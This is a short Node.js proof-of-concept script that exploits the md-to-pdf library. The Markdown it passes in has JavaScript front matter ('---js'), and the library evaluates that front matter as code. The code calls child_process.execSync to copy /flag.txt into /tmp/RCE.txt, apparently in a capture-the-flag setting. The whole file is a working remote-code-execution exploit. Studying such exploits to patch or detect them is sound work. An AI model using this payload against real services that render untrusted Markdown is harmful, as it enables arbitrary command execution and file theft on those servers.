const { mdToPdf } = require('md-to-pdf');

var payload = '---js\n((require("child_process")).execSync("cat /flag.txt > /tmp/RCE.txt"))\n---RCE';

(async () => {
    await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();
